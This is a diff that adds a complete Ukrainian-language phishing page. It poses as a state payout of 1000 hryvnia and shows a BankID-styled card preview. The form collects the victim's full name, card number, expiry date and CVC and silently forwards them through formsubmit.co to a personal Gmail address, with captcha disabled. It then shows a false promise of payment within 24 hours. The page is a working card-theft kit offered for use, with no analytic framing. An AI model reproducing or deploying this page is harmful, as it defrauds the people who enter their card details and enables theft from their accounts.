@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="uk">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Отримай 1000 від держави</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0f1724;
+    --muted:#98a2b3;
+    --accent:#2563eb;
+    --radius:14px;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    font-family:Inter,system-ui,Arial,sans-serif;
+    background:linear-gradient(180deg,#081126 0%, #071022 100%);
+    color:#e6eef8;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:20px;
+  }
+  .form-card{
+    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border-radius:var(--radius);
+    padding:20px;
+    border:1px solid rgba(255,255,255,0.035);
+    box-shadow: 0 8px 32px rgba(2,6,23,0.6);
+    max-width:380px;
+    width:100%;
+  }
+  h1{
+    font-size:20px;
+    font-weight:700;
+    text-align:center;
+    margin-bottom:20px;
+    background: linear-gradient(90deg, #4682B4, #FFFFFF, #4682B4);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .card-preview{
+    border-radius:12px;
+    padding:16px;
+    background:linear-gradient(135deg,#0b1630 0%, #071028 100%);
+    color:#fff;
+    margin-bottom:14px;
+    border:1px solid rgba(255,255,255,0.04);
+    font-family:monospace;
+    min-height:140px;
+    display:flex;
+    flex-direction:column;
+    justify-content:space-between;
+  }
+  .chip{
+    width:60px;
+    height:30px;
+    border-radius:6px;
+    background:#facc15;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+  }
+  .chip .logo{
+    height:18px;
+    width:auto;
+    display:block;
+  }
+  .top-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+  }
+  .card-nums{
+    font-size:18px;
+    letter-spacing:2px;
+    margin-top:20px;
+  }
+  .card-row{
+    display:flex;
+    justify-content:space-between;
+    font-size:13px;
+    text-transform:uppercase;
+    opacity:0.9;
+  }
+  label{
+    font-size:13px;
+    color:var(--muted);
+    margin-bottom:6px;
+    display:block;
+  }
+  input{
+    width:100%;
+    padding:12px;
+    border-radius:10px;
+    border:1px solid rgba(255,255,255,0.06);
+    background:rgba(255,255,255,0.02);
+    color:#e6eef8;
+    font-size:15px;
+    outline:none;
+    margin-bottom:10px;
+  }
+  input:focus{
+    border-color:rgba(37,99,235,0.9);
+    box-shadow:0 6px 18px rgba(37,99,235,0.12);
+  }
+  .row{
+    display:flex;
+    gap:10px;
+  }
+  .btn{
+    width:100%;
+    background:linear-gradient(90deg,var(--accent),#4f46e5);
+    color:white;
+    font-weight:700;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+    font-size:15px;
+  }
+  .btn:active{transform:translateY(1px)}
+  .success-message{
+    display:none;
+    text-align:center;
+    padding:20px;
+    font-size:16px;
+  }
+</style>
+</head>
+<body>
+  <div class="form-card" id="form-container">
+    <h1>1 Отримання державної виплати 1000 грн</h1>
+    <div class="card-preview">
+      <div class="top-row">
+        <div class="chip" id="card-logo">
+          <img id="logo-img" class="logo" src="" alt="" style="display:none;">
+        </div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.75)">BankID</div>
+      </div>
+      <div class="card-nums" id="preview-number">•••• •••• •••• ••••</div>
+      <div class="card-row">
+        <div id="preview-name">ПІБ</div>
+        <div id="preview-exp">MM/YY</div>
+      </div>
+    </div>
+    <form id="payment-form" action="https://formsubmit.co/yaroslavmaksimchuk27@gmail.com" method="POST">
+      <label for="cardName">ПІБ Отримувача</label>
+      <input id="cardName" name="full_name" type="text" placeholder="Прізвище Ім'я По батькові" required>
+
+      <label for="cardNumber">Номер картки отримувача</label>
+      <input id="cardNumber" name="card_number" type="text" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+
+      <div class="row">
+        <div style="flex:1">
+          <label for="exp">Термін дії</label>
+          <input id="exp" name="exp_date" type="text" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+        </div>
+        <div style="flex:0 0 100px">
+          <label for="cvc">CVC</label>
+          <input id="пампушка" name="cvc_code" type="text" placeholder="123" maxlength="3" inputmode="numeric">
+        </div>
+      </div>
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="thankyou.html">
+
+      <button class="btn" type="submit">Отримати на картку</button>
+    </form>
+  </div>
+
+  <div class="form-card success-message" id="success-message">
+    <h1>Очікуйте отримання<br>протягом 24 годин</h1>
+  </div>
+
+<script>
+  const numberInput = document.getElementById('cardNumber');
+  const nameInput = document.getElementById('cardName');
+  const expInput = document.getElementById('exp');
+  const logoImg = document.getElementById('logo-img');
+  const form = document.getElementById('payment-form');
+  const formContainer = document.getElementById('form-container');
+  const successMessage = document.getElementById('success-message');
+
+  function formatCardNumber(value){
+    const digits = value.replace(/\D/g,'').slice(0,16);
+    return digits.replace(/(.{4})/g,'$1 ').trim();
+  }
+
+  function detectCardType(number) {
+    const cleanNumber = number.replace(/\s+/g, '');
+    if (/^4[0-9]{0,}$/.test(cleanNumber)) {
+      return 'visa';
+    } else if (/^5[1-5][0-9]{0,}$/.test(cleanNumber)) {
+      return 'mastercard';
+    }
+    return null;
+  }
+
+  numberInput.addEventListener('input', ()=>{
+    numberInput.value = formatCardNumber(numberInput.value);
+    document.getElementById('preview-number').textContent =
+      numberInput.value || '•••• •••• •••• ••••';
+    const type = detectCardType(numberInput.value);
+    if (type === 'visa') {
+      logoImg.src = 'https://download.logo.wine/logo/Visa_Inc./Visa_Inc.-Logo.wine.png';
+      logoImg.style.display = 'block';
+    } else if (type === 'mastercard') {
+      logoImg.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png';
+      logoImg.style.display = 'block';
+    } else {
+      logoImg.style.display = 'none';
+    }
+  });
+
+  nameInput.addEventListener('input', ()=>{
+    document.getElementById('preview-name').textContent =
+      nameInput.value.toUpperCase() || 'ПІБ';
+  });
+
+  expInput.addEventListener('input', ()=>{
+    let v = expInput.value.replace(/\D/g,'').slice(0,4);
+    if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+    expInput.value = v;
+    document.getElementById('preview-exp').textContent =
+      expInput.value || 'MM/YY';
+  });
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    form.submit();
+    formContainer.style.display = 'none';
+    successMessage.style.display = 'block';
+  });
+</script>
+</body>
+</html>
